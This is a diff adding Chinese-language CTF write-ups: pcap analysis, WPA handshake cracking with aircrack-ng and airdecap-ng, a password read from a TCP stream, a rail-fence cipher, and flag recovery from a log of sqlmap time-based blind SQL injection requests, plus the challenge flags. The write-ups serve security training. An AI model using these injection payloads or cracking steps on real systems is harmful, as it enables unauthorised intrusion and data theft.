@@ -1176,6 +1176,131 @@ welcometovenus
 
 根据题目要求，key{welcometovenus}
 
+### 流量分析
+
+一个pcapng包，用wireshark打开，过滤http，在最后找到了一个zip压缩包`%E6%83%85%E6%8A%A5.zip`，URL解码得到`情报.zip`
+
+于是导出分组字节流，保存为zip压缩包，打开是一个doc文件，里面什么都没有，在其简介的注释一栏看到flag：key{23ac600a11eaffc8}
+
+### A记录
+
+用wireshark打开，发现被加了密
+
+使用`aircrack-ng`进行破解，扔进kali
+
+```
+root@kali:~/Desktop# aircrack-ng shipin.cap
+Opening shipin.cap
+Read 16664 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening shipin.cap
+Please specify a dictionary (option -w).
+
+
+Quitting aircrack-ng...
+```
+
+发现是wpa加密，用字典爆破一下
+
+```
+root@kali:~/Desktop# aircrack-ng shipin.cap -w password.txt 
+Opening shipin.cap
+Read 16664 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening shipin.cap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.2 rc3
+
+
+                   [00:00:00] 8 keys tested (486.23 k/s)
+
+
+                           KEY FOUND! [ 88888888 ]
+
+
+      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 
+                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F 
+
+      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F 
+                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C 
+                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD 
+                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 
+
+      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A 
+```
+
+密码是88888888
+
+再使用`airdecap-ng`破解
+
+```
+root@kali:~/Desktop# airdecap-ng shipin.cap -e 0719 -p 88888888
+Total number of packets read         16664
+Total number of WEP data packets         0
+Total number of WPA data packets        27
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets        16
+```
+
+发现多了一个`shipin-dec.cap`
+
+再用wireshark打开，在过滤器中输入dns
+
+第一个A记录是`google.com`，但并不是答案，因为它不是视频网站
+
+所以第二个才是我们所要的，域名是：`push.m.youku.com`
+
+所以flag是ctf{push.m.youku.com}
+
+### Password
+
+用wireshark打开pcap包，发现全是TCP流量，随便找一个追踪TCP流
+
+看到`Password: backdoor…00Rm8.ate`
+
+但有四个点不知道是什么，将显示数据选为HEX转存，我们就能看到对应的16进制编码
+
+```
+000000B9  62                                               b
+000000BA  61                                               a
+000000BB  63                                               c
+000000BC  6b                                               k
+000000BD  64                                               d
+000000BE  6f                                               o
+000000BF  6f                                               o
+000000C0  72                                               r
+000000C1  7f                                               .
+000000C2  7f                                               .
+000000C3  7f                                               .
+000000C4  30                                               0
+000000C5  30                                               0
+000000C6  52                                               R
+000000C7  6d                                               m
+000000C8  38                                               8
+000000C9  7f                                               .
+000000CA  61                                               a
+000000CB  74                                               t
+000000CC  65                                               e
+000000CD  0d                                               .
+```
+
+查询一下，`7f`是退格，`0d`是回车，所以flag就是flag{backd00Rmate}
+
 ### Decode3
 
 jsfuck，直接扔进console里面运行一下
@@ -1203,6 +1328,93 @@ f__l4}a_gf{u_nJ_u0s.t0
 一眼就看出来是栅栏密码了
 
 分个组，读一下，得到flag{\_Just_4_fun_0.0_}
+
+### 日志记录
+
+得到一个没有后缀的文件，打开看到rar文件头，猜测是rar文件，扔到binwalk看一下，果然是，于是添加rar后缀，解压，得到一个log文件
+
+打开，发现都是经过URL编码的，解码一下，方便我们查看
+
+打开，是注入过程，一段一段的看，发现字段名就是flag，搜索flag关键字，从2345行开始，便是flag字段的注入过程
+
+响应结果并没看出来有什么不同，不过每一位的判断中都有`!=`，于是猜测这个数据很有可能就是我们想要的，提取出来
+
+```
+2352 192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))!=82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2360 192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))!=79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2368 192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index. php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))!=73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2376 192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2384 192.168.52.1 - - [06/Nov/2015:19:33:23 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),5,1))!=123),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2392 192.168.52.1 - - [06/Nov/2015:19:33:27 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),6,1))!=109),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2400 192.168.52.1 - - [06/Nov/2015:19:33:30 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),7,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2408 192.168.52.1 - - [06/Nov/2015:19:33:33 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),8,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2416 192.168.52.1 - - [06/Nov/2015:19:33:36 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),9,1))!=99),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2424 192.168.52.1 - - [06/Nov/2015:19:33:41 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),10,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2432 192.168.52.1 - - [06/Nov/2015:19:33:43 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),11,1))!=65),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2440 192.168.52.1 - - [06/Nov/2015:19:33:48 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),12,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2448 192.168.52.1 - - [06/Nov/2015:19:33:54 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),13,1))!=64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2456 192.168.52.1 - - [06/Nov/2015:19:33:59 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),14,1))!=108),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2464 192.168.52.1 - - [06/Nov/2015:19:34:03 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),15,1))!=121),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2472 192.168.52.1 - - [06/Nov/2015:19:34:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),16,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2480 192.168.52.1 - - [06/Nov/2015:19:34:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),17,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2488 192.168.52.1 - - [06/Nov/2015:19:34:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),18,1))!=115),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2496 192.168.52.1 - - [06/Nov/2015:19:34:20 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),19,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2504 192.168.52.1 - - [06/Nov/2015:19:34:25 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),20,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2512 192.168.52.1 - - [06/Nov/2015:19:34:28 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),21,1))!=71),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2520 192.168.52.1 - - [06/Nov/2015:19:34:30 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),22,1))!=49),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2528 192.168.52.1 - - [06/Nov/2015:19:34:35 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),23,1))!=110),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2536 192.168.52.1 - - [06/Nov/2015:19:34:41 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),24,1))!=120),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2544 192.168.52.1 - - [06/Nov/2015:19:34:46 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),25,1))!=95),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2552 192.168.52.1 - - [06/Nov/2015:19:34:50 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),26,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2560 192.168.52.1 - - [06/Nov/2015:19:34:55 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),27,1))!=105),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2568 192.168.52.1 - - [06/Nov/2015:19:35:00 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),28,1))!=109),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2576 192.168.52.1 - - [06/Nov/2015:19:35:05 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),29,1))!=125),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+
+2584 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))!=5),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2585 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>64),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2586 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>32),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2587 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>16),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2588 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>8),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2589 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>4),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2590 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>2),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+2591 192.168.52.1 - - [06/Nov/2015:19:35:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),30,1))>1),SLEEP(2),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
+```
+
+可以得到
+
+```
+82 79 73 83 123 109 105 83 99 95 65 110 64 108 121 83 105 115 95 110 71 49 110 120 95 83 105 109 125 
+```
+
+转为字符得到ROIS{miSc_An@lySis_nG1nx_Sim}
 
 ### 注入过程
 
